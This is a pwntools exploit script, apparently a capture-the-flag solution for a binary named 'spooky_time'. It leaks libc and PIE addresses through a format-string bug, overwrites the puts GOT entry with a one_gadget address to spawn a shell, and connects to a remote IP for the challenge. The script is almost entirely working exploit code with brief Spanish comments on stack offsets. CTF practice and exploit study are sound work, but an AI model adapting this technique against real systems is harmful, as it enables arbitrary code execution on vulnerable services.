from pwn import *

gs = '''
b *main+175
continue
'''

elf = context.binary = ELF("./spooky_time")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        #return remote("hidden.ctf.intigriti.io", 1337)
        return remote("94.237.59.199", 49135)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

# Fuzzing

"""
for i in range(1, 200):
    io = process(elf.path)
    #io = start()

    io.recvuntil("scary!\n\n")

    io.sendline(f"AAAA.%{i}$p".encode())

    io.recvuntil(b"than")

    io.recvline()

    print(f"[+] {i}", io.recvline().strip())

    #input("PAUSE")

    io.close()
"""

# En 36 esta el pie
# En 3 esta libc address
# En 39 esta una direccion de la pila, sumale 0x441 y llegas a la funcion de ret de main a cambiar

io = start()

io.recvuntil("scary!\n\n")

#io.sendline(f"%3$p".encode())
io.sendline(f"%3$p.%51$p".encode())
# libc address . pie address

io.recvuntil(b"than")

io.recvline()

ans = io.recvline().strip().decode().split(".")

leak_libc, pie_base = int(ans[0], 16), int(ans[1], 16)

print(f"[+] Leak libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x114a37#leak_libc - (libc.sym.write + 23)
elf.address = pie_base - 0x13c0

print(f"[+] System: {hex(libc.sym.system)}")

print(f"[+] elf.got.puts: {hex(elf.got.puts)}")

print(f"[+] elf.got.printf: {hex(elf.got.printf)}")

gadget = libc.address + 0xebcf5

print(f"[+] Gadget Address: {hex(gadget)}")

writes_dict = {
    elf.got.puts: gadget
}

payload = fmtstr_payload(8, writes_dict, write_size='short')

#payload = fmtstr_payload(8, {stack_leak: elf.sym.main}, write_size='short')

io.recvuntil(b"time..")
io.recvline()
io.recvline()
io.recvline()
#print(elf.got)
#input("PAUSE")
io.sendline(payload)

io.interactive()
